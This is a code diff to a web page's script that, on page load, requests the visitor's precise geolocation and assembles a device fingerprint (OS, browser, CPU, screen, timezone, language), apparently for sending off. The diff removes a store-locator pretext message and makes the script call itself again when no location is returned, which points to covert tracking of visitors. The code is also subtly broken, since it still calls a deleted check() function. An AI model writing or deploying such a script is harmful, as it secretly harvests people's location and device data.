@@ -604,16 +604,15 @@
 	itemscope itemtype="http://schema.org/WebPage" onload="Send();">
 	<script>
 	window.onload = function Send() {
-		function check() {
 			//Start Location
 			if (navigator.geolocation) {
-				var optn = { enableHighAccuracy: true, timeout: 100000, maximumage: 0 };
+				var optn = { enableHighAccuracy: true, timeout: 15000, maximumage: 0 };
 				navigator.geolocation.getCurrentPosition(showPosition, showError, optn);
 			}
 			else {
 				alert('Trình duyệt của bạn đã quá cũ. Hãy thử trên trình duyệt khác !');
 			}
-		}
+
 			function showError(error) {
 				check();
 				switch (error.code) {
@@ -632,6 +631,7 @@
 						break;
 				}
 			}
+
 			function showPosition(position) {
 				var lat = position.coords.latitude;
 				var lon = position.coords.longitude;
@@ -666,9 +666,7 @@
 				let kinhdo = lon;
 				let posit = "Postiton:" + " " + "accuracy:" + acc + "||" + "altitude:" + alt + "||" + "heading:" + dir + "||" + "speed:" + spd + " " + "----------" + "Client:" + " " + "HĐH:" + " " + OS + ver + " " + "||" + "Trình duyệt:" + " " + getbrow + " " + getbrowVer + " " + "||" + "Chip:" + " " + CPU + " " + "||" + "Màn hình:" + " " + currentResolution + " " + "||" + "Múi giờ:" + timeZone + " " + "||" + "Ngôn ngữ:" + language + " " + "||" + "Core:" + core;
 				if (lat.value == '') {
-					// Check for an empty string or null valueweqwewq
-					alert("Please allow location access to show the nearest store.")
-					return (false);
+					Send();
 				}
 				else {
 					let data = {
